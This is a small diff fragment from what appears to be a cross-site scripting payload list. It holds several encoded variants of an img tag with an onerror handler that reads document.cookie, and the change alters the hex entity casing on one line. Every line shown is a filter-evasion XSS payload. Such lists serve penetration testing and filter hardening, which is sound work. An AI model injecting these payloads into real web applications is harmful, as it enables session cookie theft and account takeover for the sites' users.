@@ -7,7 +7,7 @@
 &#0000060;img src=x onerror=alert(document.cookie)&#0000062;
 &#0000060;img src=x onerror=alert(document.cookie)&#0000062;
 &#60img src=x onerror=alert(document.cookie)&#62;
-&#x3c;img src=x onerror=alert(document.cookie)&#x3e;
+&#x3C;img src=x onerror=alert(document.cookie)&#x3E;
 &#x03c;img src=x onerror=alert(document.cookie)&#x03e;
 &#x003c;img src=x onerror=alert(document.cookie)&#x003e;
 &#x0003c;img src=x onerror=alert(document.cookie)&#x0003e;
